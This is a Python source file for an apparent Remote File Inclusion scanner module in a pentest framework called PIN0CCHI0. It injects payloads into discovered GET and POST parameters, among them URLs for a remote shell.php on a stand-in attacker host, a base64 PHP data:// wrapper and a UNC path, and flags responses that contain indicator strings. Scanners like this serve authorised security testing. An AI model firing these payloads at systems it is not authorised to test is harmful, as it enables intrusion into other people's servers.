#!/usr/bin/env python3

from typing import Dict, List, Optional, Tuple
import requests
import urllib.parse
from core.base_module import VulnerabilityTestingModule
from core.utils import normalize_url, make_http_request, generate_random_string

class RFIScanner(VulnerabilityTestingModule):
    """Remote File Inclusion (RFI) vulnerability scanner module for PIN0CCHI0."""

    def __init__(self, config: Dict):
        super().__init__(config)
        self.name = "rfi_scanner"
        self.description = "Tests for Remote File Inclusion vulnerabilities"
        self.author = "PIN0CCHI0 Framework"
        self.references = [
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion",
            "https://portswigger.net/web-security/file-path-traversal/lab-file-path-traversal-simple"
        ]
        self.test_payloads = [
            "http://evil.example.com/shell.php",
            "http://evil.example.com/shell.php%00",  # Null byte injection
            "http://evil.example.com/shell.php?",
            "https://raw.githubusercontent.com/payload.txt",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",  # PHP wrapper
            "\\\\evil.example.com\\shared\\shell.php",  # Windows UNC path
        ]
        self.rfi_indicators = [
            "<?php",
            "<?=",
            "<?xml",
            "#!/usr/bin/perl",
            "#!/usr/bin/python",
            "#!/usr/bin/ruby",
            "Content-Type: text/html",
            "HTTP/1.1 200 OK"
        ]
        self.vulnerabilities = []

    def setup(self) -> bool:
        """Set up the RFI scanner module."""
        self.logger.info("Setting up RFI scanner module...")
        return True

    def test_parameter(self, url: str, param: str, method: str = "GET", data: Dict = None) -> Optional[Dict]:
        """Test a single parameter for RFI vulnerability.

        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method (GET/POST)
            data: POST data if applicable

        Returns:
            Dict containing vulnerability details if found, None otherwise
        """
        for payload in self.test_payloads:
            try:
                test_url = url
                if method.upper() == "GET":
                    if "?" in url:
                        test_url = f"{url}&{param}={payload}"
                    else:
                        test_url = f"{url}?{param}={payload}"
                    response = make_http_request(test_url, method="GET", headers=self.config.get("headers", {}))
                else:
                    post_data = data.copy() if data else {}
                    post_data[param] = payload
                    response = make_http_request(url, method="POST", data=post_data, headers=self.config.get("headers", {}))

                if response and response.status_code == 200:
                    for indicator in self.rfi_indicators:
                        if indicator in response.text:
                            return {
                                "type": "Remote File Inclusion",
                                "url": url,
                                "parameter": param,
                                "method": method,
                                "payload": payload,
                                "evidence": indicator,
                                "severity": "High",
                                "description": f"Remote File Inclusion vulnerability found in {param} parameter",
                                "mitigation": "Implement proper input validation and whitelisting of allowed file inclusions"
                            }

            except Exception as e:
                self.logger.error(f"Error testing RFI payload: {str(e)}")

        return None

    def discover_parameters(self, url: str) -> Tuple[List[str], Dict]:
        """Discover parameters that might be vulnerable to RFI.

        Args:
            url: Target URL

        Returns:
            Tuple of (GET parameters list, POST form data dict)
        """
        get_params = []
        post_data = {}

        try:
            response = make_http_request(url, method="GET", headers=self.config.get("headers", {}))
            if response:
                # Extract GET parameters from URL
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                get_params.extend(query_params.keys())

                # Look for form parameters
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    inputs = form.find_all(['input', 'textarea'])
                    for input_field in inputs:
                        if input_field.get('name'):
                            if form.get('method', '').lower() == 'post':
                                post_data[input_field['name']] = ''
                            else:
                                get_params.append(input_field['name'])

        except Exception as e:
            self.logger.error(f"Error discovering parameters: {str(e)}")

        return get_params, post_data

    def run(self, target: str) -> bool:
        """Run the RFI scanner module.

        Args:
            target: Target URL or domain

        Returns:
            bool: True if the scan completed successfully
        """
        self.logger.info(f"Starting RFI scan on {target}")
        target = normalize_url(target)

        try:
            # Discover parameters to test
            get_params, post_data = self.discover_parameters(target)

            # Test GET parameters
            for param in get_params:
                result = self.test_parameter(target, param, method="GET")
                if result:
                    self.vulnerabilities.append(result)

            # Test POST parameters
            for param in post_data.keys():
                result = self.test_parameter(target, param, method="POST", data=post_data)
                if result:
                    self.vulnerabilities.append(result)

            # Test common RFI parameter names if not already tested
            common_params = ["file", "page", "include", "doc", "template", "path", "load"]
            for param in common_params:
                if param not in get_params:
                    result = self.test_parameter(target, param, method="GET")
                    if result:
                        self.vulnerabilities.append(result)

            self.logger.info(f"RFI scan completed. Found {len(self.vulnerabilities)} vulnerabilities.")
            return True

        except Exception as e:
            self.logger.error(f"Error during RFI scan: {str(e)}")
            return False

    def cleanup(self) -> bool:
        """Clean up the RFI scanner module."""
        self.logger.info("Cleaning up RFI scanner module...")
        return True